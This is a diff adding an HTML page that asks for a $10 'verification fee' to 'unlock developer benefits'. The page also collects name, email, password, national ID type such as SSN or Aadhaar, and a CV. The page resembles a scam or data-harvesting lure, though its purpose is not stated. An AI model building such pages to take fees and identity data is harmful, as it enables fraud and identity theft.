@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Proceeding</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #2c3e50, #4CA1AF);
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            max-width: 700px;
+            width: 90%;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
+            padding: 30px;
+            margin: 20px;
+            backdrop-filter: blur(10px);
+        }
+
+        h3 {
+            font-size: 1.8rem;
+            color: #4CAF50;
+            text-align: center;
+            margin-top: 0;
+        }
+
+        p {
+            font-size: 1rem;
+            line-height: 1.6;
+            margin-bottom: 20px;
+            text-align: center;
+            color: #eee;
+        }
+
+        .submission-note {
+            background: rgba(255, 193, 7, 0.1);
+            border: 1px solid #ffc107;
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 20px;
+        }
+
+        .submission-note h3 {
+            color: #ffc107;
+            margin: 0;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            margin-top: 20px;
+        }
+
+        label {
+            font-weight: bold;
+            margin-top: 15px;
+            font-size: 1rem;
+        }
+
+        input,
+        textarea,
+        select,
+        button {
+            width: 100%;
+            margin-top: 8px;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 1rem;
+            background: rgba(255, 255, 255, 0.8);
+            color: #333;
+            transition: all 0.3s ease;
+        }
+
+        input:focus,
+        textarea:focus,
+        select:focus {
+            border-color: #4CAF50;
+            outline: none;
+            box-shadow: 0 0 6px rgba(76, 175, 80, 0.4);
+        }
+
+        button {
+            background-color: #4CAF50;
+            color: #ffffff;
+            font-weight: bold;
+            margin-top: 20px;
+            cursor: pointer;
+            border: none;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #45a049;
+        }
+
+        #paypal-button-container {
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        #password-strength {
+            margin-top: 10px;
+            font-size: 0.9rem;
+            font-weight: bold;
+            color: #fff;
+        }
+
+        .file-input {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid #aaa;
+            color: #fff;
+            font-size: 0.9rem;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px;
+            }
+
+            h3 {
+                font-size: 1.5rem;
+            }
+
+            p {
+                font-size: 0.9rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h3>Verification Proceeding</h3>
+        <p>Pay a one-time verification fee of $10 to unlock developer benefits.</p>
+        <div id="paypal-button-container"></div>
+    </div>
+
+    <div class="container submission-note">
+        <h3>Important:</h3>
+        <p>Ensure all submitted details are accurate and authentic.</p>
+    </div>
+
+    <div class="container">
+        <h3>Submit Your Details</h3>
+        <form action="submit_details.php" method="POST" enctype="multipart/form-data">
+            <label for="name">Full Name:</label>
+            <input type="text" id="name" name="name" required>
+
+            <label for="email">Email Address:</label>
+            <input type="email" id="email" name="email" required>
+
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" required>
+            <div id="password-strength">Password strength: Weak</div>
+
+            <label for="country">Country:</label>
+            <select id="country" name="country" required>
+                <option value="">Select your country</option>
+                <option value="nigeria">Nigeria</option>
+                <option value="usa">United States</option>
+                <option value="india">India</option>
+                <option value="uk">United Kingdom</option>
+                <option value="canada">Canada</option>
+            </select>
+
+            <label for="identification">Means of Identification:</label>
+            <select id="identification" name="identification" required></select>
+
+            <label for="cv">Upload Your CV:</label>
+            <input type="file" id="cv" name="cv" accept=".pdf,.doc,.docx" class="file-input" required>
+
+            <button type="submit">Submit</button>
+        </form>
+    </div>
+
+    <script>
+        // Password strength indicator
+        const passwordInput = document.getElementById('password');
+        const passwordStrength = document.getElementById('password-strength');
+
+        passwordInput.addEventListener('input', () => {
+            const value = passwordInput.value;
+            let strength = 'Weak';
+
+            if (value.length >= 8 && /[A-Z]/.test(value) && /[a-z]/.test(value) && /\d/.test(value) && /[^A-Za-z0-9]/.test(value)) {
+                strength = 'Strong';
+            } else if (value.length >= 6) {
+                strength = 'Medium';
+            }
+
+            passwordStrength.textContent = `Password strength: ${strength}`;
+            passwordStrength.style.color = strength === 'Strong' ? 'green' : strength === 'Medium' ? 'orange' : 'red';
+        });
+
+        // Dynamic identification options
+        const countrySelect = document.getElementById('country');
+        const identificationSelect = document.getElementById('identification');
+        const identificationOptions = {
+            nigeria: ["NIN", "Driver's License", "Voter's Card"],
+            usa: ["Social Security Number (SSN)", "Driver's License", "Passport"],
+            india: ["Aadhaar Card", "PAN Card", "Voter ID"],
+            uk: ["National Insurance Number", "Driver's License", "Passport"],
+            canada: ["Social Insurance Number (SIN)", "Driver's License", "Passport"]
+        };
+
+        countrySelect.addEventListener('change', () => {
+            const country = countrySelect.value;
+            identificationSelect.innerHTML = '<option value="">Select means of identification</option>';
+            if (identificationOptions[country]) {
+                identificationOptions[country].forEach(option => {
+                    const opt = document.createElement('option');
+                    opt.value = option.toLowerCase().replace(/\s+/g, '_');
+                    opt.textContent = option;
+                    identificationSelect.appendChild(opt);
+                });
+            }
+        });
+    </script>
+</body>
+</html>
